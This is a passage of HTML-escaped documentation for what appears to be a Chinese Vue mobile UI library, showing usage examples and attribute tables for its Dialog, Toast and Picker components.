class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  \u003cspan class=\"hljs-attr\"\u003emethods\u003c/span\u003e: {\n    showSimpleDialog () {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.$dialog({\n        \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'普通 Dialog'\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003ecancelText\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'取消'\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003eokText\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'确定'\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'测试 Dialog，测试 Dialog，测试 Dialog~~~'\u003c/span\u003e\n      })\n    }\n  }\n}\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e自定义 HTML\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eexample-block\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"自定义 HTML\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e @\u003cspan class=\"hljs-attr\"\u003eclick\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"showHtmlDialog\"\u003c/span\u003e\u0026gt;\u003c/span\u003eHTML Dialog\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eexample-block\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  \u003cspan class=\"hljs-attr\"\u003emethods\u003c/span\u003e: {\n    showHtmlDialog () {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.$dialog({\n        \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'自定义 HTML'\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003ecancelText\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'取消'\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003eokText\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'确定'\u003c/span\u003e,\n        \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'\u0026lt;strong style=\"color: green\"\u0026gt;测试 Dialog，测试 Dialog，测试 Dialog~~~\u0026lt;/strong style=\"color: green\"\u0026gt;'\u003c/span\u003e\n      })\n    }\n  }\n}\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e高阶Dialog组件用法\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eexample-block\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"Dialog 模板\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e @\u003cspan class=\"hljs-attr\"\u003eclick\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"showDialogTpl\"\u003c/span\u003e\u0026gt;\u003c/span\u003eDialog Template\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eexample-block\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ev-dialog\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"Dialog 模板\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003ecancelText\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"取消\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003eokText\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"确认\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"测试 Dialog，测试 Dialog，测试 Dialog~~~\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003e:show\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"showDialog\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003e:onCancel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"close\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003e:onOk\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"close\"\u003c/span\u003e\n    \u0026gt;\u003c/span\u003e\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"modal-text\"\u003c/span\u003e\u0026gt;\u003c/span\u003eDialog Template slot ！！！\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ev-dialog\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  data () {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n      \u003cspan class=\"hljs-attr\"\u003eshowDialog\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n    }\n  },\n  \u003cspan class=\"hljs-attr\"\u003emethods\u003c/span\u003e: {\n    showDialogTpl () {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.showDialog = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    },\n    close () {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.showDialog = \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n    }\n  }\n}\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003eAttributes(modal)\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e参数\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e类型\u003c/th\u003e\n\u003cth\u003e可选值\u003c/th\u003e\n\u003cth\u003e默认值\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eshow\u003c/td\u003e\n\u003ctd\u003emodal是否显示\u003c/td\u003e\n\u003ctd\u003eboolean\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003etitle\u003c/td\u003e\n\u003ctd\u003emodal标题\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003econtent\u003c/td\u003e\n\u003ctd\u003emodal内容\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eonOk\u003c/td\u003e\n\u003ctd\u003e确定按钮回调\u003c/td\u003e\n\u003ctd\u003efunction\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eonCancel\u003c/td\u003e\n\u003ctd\u003e取消按钮回调\u003c/td\u003e\n\u003ctd\u003efunction\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eokText\u003c/td\u003e\n\u003ctd\u003e确定按钮内容\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ecancelText\u003c/td\u003e\n\u003ctd\u003e取消按钮内容\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eshowCloseIcon\u003c/td\u003e\n\u003ctd\u003e是否显示关闭icon\u003c/td\u003e\n\u003ctd\u003eboolean\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003etrue\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 class=\"heading\"\u003e5. Toast 轻提示\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e基本用法\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eexample-block\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"基础用法\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e @\u003cspan class=\"hljs-attr\"\u003eclick\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"showSimpleToast\"\u003c/span\u003e\u0026gt;\u003c/span\u003e普通文字提示\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eexample-block\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  \u003cspan class=\"hljs-attr\"\u003emethods\u003c/span\u003e: {\n    showSimpleToast () {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.$toast({\u003cspan class=\"hljs-attr\"\u003emsg\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'我是文字提示~'\u003c/span\u003e});\n    }\n  }\n}\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e自定义 HTML\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eexample-block\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"自定义HTML\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e @\u003cspan class=\"hljs-attr\"\u003eclick\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"showHtmlToast\"\u003c/span\u003e\u0026gt;\u003c/span\u003e自定义HTML文本提示\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebutton\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003eexample-block\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  \u003cspan class=\"hljs-attr\"\u003emethods\u003c/span\u003e: {\n    showHtmlToast () {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.$toast(\u003cspan class=\"hljs-string\"\u003e'\u0026lt;strong style=\"font-size: 20px;\"\u0026gt;HTML文字提示~\u0026lt;/strong\u0026gt;'\u003c/span\u003e);\n    }\n  }\n}\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003eAttributes\u003c/h3\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e参数\u003c/th\u003e\n\u003cth\u003e说明\u003c/th\u003e\n\u003cth\u003e类型\u003c/th\u003e\n\u003cth\u003e可选值\u003c/th\u003e\n\u003cth\u003e默认值\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003emsg\u003c/td\u003e\n\u003ctd\u003emsg文本内容\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003etimeout\u003c/td\u003e\n\u003ctd\u003emsg显示时长\u003c/td\u003e\n\u003ctd\u003enumber\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e2000\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ecallback\u003c/td\u003e\n\u003ctd\u003e回调函数\u003c/td\u003e\n\u003ctd\u003efunction\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eicon\u003c/td\u003e\n\u003ctd\u003e特殊icon\u003c/td\u003e\n\u003ctd\u003estring\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003ctd\u003e—\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch2 class=\"heading\"\u003e6. Picker 选择器\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003e包含常用的 4 种选择器，时间，日期，时间与日期，以及普通选择器\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e基本用法\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e1、时间类型选择器（切换 type 即可）\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ex-picker\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"选择日期\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003eplaceholder\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"请选择日期\"\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003ev-model\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"now_date\"\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"date\"\u003c/span\u003e\n  \u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ex-picker\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  data() {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n      \u003cspan class=\"hljs-attr\"\u003enow_date\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e// new Date().getTime()/1000\u003c/span\u003e\n    };\n  }\n};\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e2、custom 普通选择器\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ex-picker\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003ev-model\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"gender.value\"\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003eplaceholder\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"请选择性别\"\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003e:default\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"gender.default\"\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"选择性别\"\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"custom\"\u003c/span\u003e\n  \u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ex-picker\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"actionscript\"\u003e\nexport \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  data() {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n     gender: {\n        \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e-1\u003c/span\u003e,\n        value: [\n          { name: \u003cspan class=\"hljs-string\"\u003e\"保密\"\u003c/span\u003e, value: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e },\n          { name: \u003cspan class=\"hljs-string\"\u003e\"男\"\u003c/span\u003e, value: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e },\n          { name: \u003cspan class=\"hljs-string\"\u003e\"女\"\u003c/span\u003e, value: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e }\n        ]\n      }\n    };\n  }\n};\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e高阶用法\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e使用 timeStep 进行分钟的粒度选择\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ex-picker\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"选择日期\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003eplaceholder\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"请选择日期\"\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003ev-model\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"now_date\"\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"date\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003e:timeStep\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"20\"\u003c/span\u003e\n  \u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ex-picker\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  data() {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n      \u003cspan class=\"hljs-attr\"\u003enow_date\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e// new Date().getTime()/1000\u003c/span\u003e\n    };\n  }\n};\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e使用 startYear，endYear，startDate，endDate，startMinute，endMinute 进行时间的范围选择。（更多的可看实际情况进行搭配）\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ex-picker\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003etitle\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"选择日期\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003eplaceholder\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"请选择日期\"\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003ev-model\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"now_date\"\u003c/span\u003e \n    \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"date\"\u003c/span\u003e\n    \u003cspan class=\"hljs-attr\"\u003estartMinute\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"2\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eendMinute\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"30\"\u003c/span\u003e\n  \u0026gt;\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ex-picker\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etemplate\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"javascript\"\u003e\n\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e {\n  data() {\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e {\n      \u003cspan class=\"hljs-attr\"\u003enow_date\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e// new Date().getTime()/1000\u003c/span\u003e\n    };\n  }\n};\n\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 